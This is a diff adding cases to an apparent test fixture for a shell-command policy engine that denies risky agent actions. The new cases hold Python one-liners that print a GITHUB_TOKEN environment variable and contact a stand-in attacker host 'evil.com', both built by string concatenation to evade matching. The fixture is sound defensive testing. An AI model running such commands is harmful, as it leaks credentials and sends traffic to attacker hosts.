@@ -4626,3 +4626,14 @@
   threat: T3
   action: { shell: "python3 -c 'print(__import__(\"os\").__dict__)'" }
   expect: { verdict: deny, rules: [env-dump] }
+
+# Still denied with the opaque-code ask beside it: the variable name and the host are
+# read even when built (`env-dump`, `default.net`).
+- id: python-c-built-env-name-still-denied
+  threat: T3
+  action: { shell: "python3 -c 'import os;print(os.environ[\"GITHUB_\"+\"TOKEN\"])'" }
+  expect: { verdict: deny, rules: [env-dump] }
+- id: python-c-built-url-still-denied
+  threat: T12
+  action: { shell: "python3 -c 'import urllib.request as u;u.urlopen(\"http://e\"+\"vil.com\")'" }
+  expect: { verdict: deny, rules: [default.net] }
